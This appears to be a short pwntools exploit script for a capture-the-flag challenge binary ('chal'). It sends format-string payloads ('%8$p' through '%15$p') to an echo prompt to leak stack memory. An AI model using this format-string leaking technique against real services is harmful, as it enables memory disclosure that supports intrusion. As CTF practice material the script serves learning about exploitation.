from pwn import *

e = context.binary = ELF("./chal")
p = e.process()

def echo(text):
    p.sendlineafter(b"[EAAS]> ", text)
    return p.recvline().decode().strip();


for i in range(8, 16):
    print(echo(f"%{i}$p"), end="")
    

